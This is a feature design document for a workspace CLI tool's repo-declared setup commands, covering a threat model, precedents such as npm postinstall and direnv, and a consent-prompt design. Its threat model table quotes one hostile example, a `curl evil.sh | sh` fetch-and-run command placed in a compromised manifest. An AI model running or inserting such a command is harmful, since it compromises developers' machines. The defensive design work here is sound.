# Feature: Setup Commands

## Summary

Allow repos to declare `setup_commands` in their `.wsp.yaml` manifest. When `wsp new` or `wsp add` clones a repo into a workspace, wsp runs these commands automatically -- but only after explicit user consent.

## Threat Model

### Attack vectors, ranked by realism

| # | Vector | Likelihood | Impact | Notes |
|---|--------|-----------|--------|-------|
| 1 | **Compromised repo pushes malicious `.wsp.yaml`** | Medium | High | Attacker gains commit access (leaked token, compromised CI) and adds `setup_commands: ["curl evil.sh \| sh"]`. Next developer who creates a workspace runs it. This is the npm postinstall attack pattern. |
| 2 | **Typosquat / social engineering via template file** | Low-Medium | High | Attacker shares a `.wsp.yaml` template file (Slack, docs, etc.) with embedded setup commands. User runs `wsp new -f malicious.yaml`. |
| 3 | **Malicious fork with setup commands** | Low | High | Developer is asked to review a fork. `wsp new` from the fork's template runs attacker's commands. |
| 4 | **Privilege escalation from existing repo access** | Low | Medium | A developer with write access to one repo in a multi-repo workspace adds setup commands that affect the broader machine (install global packages, modify shell config). |
| 5 | **Command injection via interpolated values** | Low | High | If wsp ever interpolates repo names, branch names, or paths into setup commands, shell metacharacters could escape. Must use `sh -c` with the literal command string, never string interpolation. |

### What is NOT a realistic threat

- **Users running their own repos.** The typical wsp user is cloning repos they own. The threat is not the happy path; it is the edge case where trust is misplaced or compromised.
- **Offline/air-gapped attacks.** Setup commands run post-clone, so the attacker already needed to get code into the repo or template.

### Key insight

The `.wsp.yaml` file lives *inside the repo*, meaning anyone with push access controls what runs. This is fundamentally different from wsp's global config (which the user controls). It is the same trust model as `Makefile`, `.github/workflows/`, or `devcontainer.json` -- files that execute arbitrary code but are reviewed through normal code review.

## Precedent Analysis

| Tool | Mechanism | Trust model | Consent UX |
|------|-----------|-------------|------------|
| **npm** postinstall | Runs automatically on `npm install` | Implicit trust of registry | `--ignore-scripts` flag to disable. pnpm v10 flipped the default: scripts are disabled unless explicitly allowed. |
| **Cargo** build.rs | Runs automatically on `cargo build` | Implicit trust of crates.io | No opt-in. JetBrains RustRover added a "Trust Project" dialog before running any cargo commands. The Rust community advice is "do not run cargo on untrusted projects." |
| **VS Code** devcontainers | `postCreateCommand` runs in container | Workspace Trust dialog | VS Code prompts "Do you trust the authors of the files in this folder?" before allowing any code execution. Binary yes/no. |
| **git** safe.directory | Controls which repos git will operate on | Explicit allowlist | Global config allowlist. Added after CVE-2022-24765 (privilege escalation via `.git` in shared dirs). |
| **direnv** `.envrc` | Loads env vars from repo-local file | Explicit per-directory approval | `direnv allow` required after every change to `.envrc`. Blocked by default. Shows diff of changes. |

### Lessons

1. **npm's mistake was running by default.** pnpm fixed this by inverting the default. The ecosystem is moving toward explicit consent.
2. **Cargo's model works because `build.rs` is visible in code review** and the Rust community accepts the tradeoff. But IDEs added their own trust layer on top.
3. **direnv is the gold standard for CLI tools.** Per-directory, per-change approval. Shows what changed. Blocks by default. Developers accept the friction because it is proportional to the risk.
4. **VS Code's binary trust dialog is too coarse.** "Trust this folder" does not tell you what will run.

## Product Recommendation

### The direnv model, adapted for wsp

**Display, then prompt. Block by default. Remember approval per-repo.**

### Detailed UX flow

When `wsp new` or `wsp add` encounters a repo with `setup_commands`:

```
Cloning 3 repos...
  ok  github.com/acme/api-gateway
  ok  github.com/acme/user-service
  ok  github.com/acme/proto

api-gateway has setup commands:
  [1] make deps
  [2] go mod download

Run these commands? [y/N/always/never]
```

- **y** -- Run now. Ask again next time.
- **N** (default) -- Skip. Workspace is created without running commands. Print a hint: `run later with: wsp setup api-gateway`
- **always** -- Run now. Remember this decision for this repo identity (stored in wsp's global config). Never ask again for this repo unless the commands change.
- **never** -- Skip. Remember this decision for this repo identity. Never ask again unless the commands change.

When a remembered repo's setup commands change (content hash differs from stored approval):

```
api-gateway setup commands have changed since last approval:
  [1] make deps
  [2] go mod download
+ [3] npm install

Run these commands? [y/N/always/never]
```

### Non-interactive mode (piped stdin, CI)

- Skip all setup commands silently. Print hint to stderr.
- `--run-setup` flag to explicitly opt in (for CI scripts that trust the repos).
- `--no-setup` flag to explicitly opt out (suppress hints).

### Manual trigger

- `wsp setup [repo...]` -- Run setup commands for specified repos (or all repos with setup commands in current workspace). Always shows commands and prompts before executing.

### Manifest format

In the per-repo `.wsp.yaml` or in a template's repo entry:

```yaml
setup_commands:
  - make deps
  - go mod download
```

Commands run sequentially, in the repo's clone directory, with the user's shell. If any command fails, halt and report. Do not run remaining commands.

### Trust storage

In `~/.local/share/wsp/config.yaml`:

```yaml
trusted_setup:
  github.com/acme/api-gateway:
    hash: "sha256:abc123..."  # hash of the setup_commands array
    decision: always           # or "never"
    decided_at: 2026-03-22T10:00:00Z
```

### Flags summary

| Flag | Scope | Behavior |
|------|-------|----------|
| `--run-setup` | `wsp new`, `wsp add` | Run all setup commands without prompting (explicit trust) |
| `--no-setup` | `wsp new`, `wsp add` | Skip all setup commands without prompting or hinting |
| `--no-discover` | `wsp new`, `wsp add` | Already exists. Skips template discovery. Does NOT affect setup commands (orthogonal concern). |

## Tradeoffs

| Decision | Upside | Downside |
|----------|--------|----------|
| **Block by default (N)** | Safe against supply chain attacks. Matches pnpm v10 direction. | Friction for trusted repos on first use. |
| **Show full commands before prompting** | User can see exactly what will run. Aligns with design tenet "no surprises." | Verbose output for repos with many setup commands. |
| **Remember per-repo with content hash** | Reduces friction over time. Re-prompts when commands change (catches compromised repos). | Adds state to global config. Hash comparison adds complexity. |
| **`wsp setup` as manual trigger** | Users who skip can run later. Scriptable. | Another command to learn. |
| **Sequential execution, halt on failure** | Simple mental model. Predictable. | Cannot parallelize setup across repos. |
| **No sandbox/container isolation** | Simple. Commands run like the user would run them. | Full access to filesystem, network, etc. Same as `make`, `npm install`, etc. |

## What this is NOT

- **Not a build system.** Setup commands are for one-time bootstrapping (install deps, generate code, etc.). Ongoing builds are the user's responsibility.
- **Not a hook system.** No pre-sync, post-pull, etc. Just post-clone setup. Scope creep toward hooks should be resisted per "just workspace management" tenet.

## Acceptance Criteria

1. `.wsp.yaml` supports a `setup_commands` field (list of strings).
2. Templates can include `setup_commands` per-repo.
3. `wsp new` and `wsp add` display setup commands and prompt before execution.
4. Default is to NOT run (safe default).
5. `always`/`never` decisions are persisted per-repo with content hash.
6. Changed commands re-prompt even if previously approved.
7. Non-interactive mode skips setup commands unless `--run-setup` is given.
8. `wsp setup` command allows manual execution after workspace creation.
9. Command failure halts execution and reports which command failed.
10. `--no-setup` suppresses prompts and hints.
11. Setup commands run in the repo's clone directory, not the workspace root.

## Open Questions

1. **Should `setup_commands` live in the per-repo `.wsp.yaml` metadata, in a separate file (e.g., `.wsp-setup.yaml`), or in a new field within the template?** Recommendation: per-repo `.wsp.yaml` is simplest and consistent with how `agent_md` works in templates. But this means the workspace metadata file gains a new field, which is a different file than the repo's own configuration. Need to decide: is this a repo-level declaration (committed to the repo) or a template-level declaration?

2. **Should `wsp sync` re-run setup commands if they changed after a pull?** Recommendation: No, for v1. This is hook territory and violates "just workspace management." Users can run `wsp setup` manually. Revisit if there is demand.

3. **Should there be a `wsp doctor` check for repos with unapproved setup commands?** Recommendation: Yes. Warn if setup commands exist but have not been run.

## References

- [npm ignore-scripts security mitigation](https://www.nodejs-security.com/blog/npm-ignore-scripts-best-practices-as-security-mitigation-for-malicious-packages)
- [pnpm supply chain security](https://pnpm.io/supply-chain-security)
- [Do not run Cargo on untrusted projects](https://shnatsel.medium.com/do-not-run-any-cargo-commands-on-untrusted-projects-4c31c89a78d6)
- [Exploiting VS Code devcontainers](https://dev.to/jamiemccrindle/exploiting-visual-studio-code-devcontainers-16fb)
- [JetBrains RustRover project security / trust dialog](https://www.jetbrains.com/help/rust/project-security.html)
